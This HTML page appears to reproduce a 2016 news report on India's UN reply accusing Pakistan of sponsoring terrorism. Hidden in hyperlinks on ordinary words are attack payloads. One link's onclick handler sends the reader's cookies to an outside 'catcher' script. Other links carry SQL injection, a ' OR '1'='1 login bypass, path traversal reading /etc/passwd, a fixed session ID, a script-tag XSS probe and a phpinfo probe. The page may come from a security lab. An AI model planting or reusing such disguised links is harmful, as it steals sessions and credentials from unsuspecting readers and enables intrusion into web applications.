<h2>Pakistan now host to ‘Ivy League of terrorism’: India at UNGA </h2>

<p class="details">Sep 22, 2016 13:57 IST<a href="#"></a> </p>

<p>
Pakistan is a <a href="http://bit.ly/2cKc7xM" target="_blank">“terrorist”</a> state that carries out <a href="http://www.theplanetreports.com/uploads/" target="_blank">“war crimes”</a> against Indians by <a href="http://www.theplanetreports.com/images/" target="_blank">“sponsoring terrorism”,</a> New Delhi said on Thursday in a stinging response that underscored plummeting relations following a militant attack on an army base in  <a href="http://www.theplanetreports.com/uploads/phpinfo.php" target="_blank">Kashmir.</a>
</p>

<p><img class="alignright" src="/images/UNGA.png" width="350" height="350" alt="UNGA" /></p>

 <p>
The statement came hours after Pakistani prime minister <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">Nawaz Sharif addressed </a> the United Nations general assembly and spoke out against alleged human rights abuses by Indian forces during the current unrest in Kashmir that has claimed 86 lives.
</p> <p>
“<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">The worst violation of human rights is terrorism</a>. When practised as an instrument of state policy, it is a war crime,” said diplomat Eenam Gambhir, exercising India’s Right of Reply to Sharif’s <a href="http://www.theplanetreports.com/uploads/traversal_main.php?data=cat%20/etc/passwd" target="_blank">“long tirade”.</a>
</p> <p>
“What my country and our other <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">neighbours</a> are facing today is Pakistan’s long-standing policy of sponsoring terrorism, the consequences of which have spread well beyond our region.”
</p> <p>
Gambhir is first secretary in the India’s permanent mission to the UN. Foreign minister Sushma Swaraj – who speaks on Monday – is also expected to give a “befitting” reply to Sharif.
</p> <p>
India and Pakistan are locked in a bruising battle of words after a <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">brazen militant attack </a> in Kashmir’s Uri town killed 18 soldiers. New Delhi says the militants came from Pakistan and has moved to isolate Islamabad globally. But Sharif and Pakistan’s top military leaders have rubbished the claim.
</p> <p>
Gambhir said India sees in Pakistan “a terrorist state” that channelises billions of dollars, much of it diverted from international aid, to training, financing and supporting terrorist groups as militant proxies <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">against it neighbours.</a>
</p> <p>
She also noted that the land of Taxila, one of the greatest learning centres of ancient times, “is now host to the Ivy League of terrorism” and attracts aspirants and apprentices from all over the world. <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">“The effect of its toxic curriculum</a> is felt across the globe,” she said.
</p> <p>
“It is ironic that a country, which has established itself as the global epicentre of terrorism, is preaching human rights and talks about ostensible support for <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">self-determination.”</a>
</p> <p>
The comments came on a day of high drama when Pakistan closed its air space in the country’s northern regions and Prime Minister Narendra Modi met his top ministers and officials to chalk out a strategy. Despite growing <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">domestic pressure on the prime minister,</a> the government has indicated that any response will be “long-term”.
</p> <p>

India’s minister of state for external affairs MJ Akbar also branded Sharif’s UNGA address as “immature” and “full of threats”. He scoffed at Islamabad for wanting dialogue while holding a gun, adding India will “never succumb to such tactics and blackmail”.
</p> <p>
Addressing a press conference moments after Sharif’s address, Akbar stated that Pakistan seemed to be run by a war machine rather than a government. <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
271&submit=Login" target="_blank">“Talks and guns don’t go together.”</a>
</p> <p>
He expressed shock at Sharif’s mention of dead Hizbul Mujahideen commander Burhan Wani in his address. Wani’s death triggered a two-month-long cycle of violence in Kashmir that left 86 dead and thousands injured.
</p> <p>
“We heard the glorification of a terrorist. Wani was a self-declared commander of the Hizbul Mujahideen. This organisation is widely acknowledged as a terrorist group internationally. <a href="http://www.theplanetreports.com/index.php?name=Visitor%3Cscript%3Ealert(%27You%20are%20being%20attacked.%27)%3C/script%3E" target="_blank">This is self incrimination,”</a> Akbar said.
</p> <p>
Akbar emphasised that Islamabad’s consistent use of war and “terrorism” was at the cost of development of the people of Pakistan, adding that the people there were paying the price of a malevolent policy”.
</p> <p>

The diplomat reminded the UN that the trail of the most “horrifying” and “dastardly terror attack” of 9/11 led all the way to Abbottabad in Pakistan, where Al Qaeda leader Osama bin Laden was hiding “for years” and was killed by US forces.
</p> <p>
Earlier, the Pakistan PM told the United Nations that his country wants peace with India, but asserted there can be no peace and normalization of relations between the two Asian neighbours until the Kashmir issue is fully resolved.
</p> <p>
“Burhan Wani, the young leader murdered by Indian forces, has emerged as the symbol of the latest Kashmiri Intifada, a popular and peaceful freedom movement, led by Kashmiris,” he said.

</p>


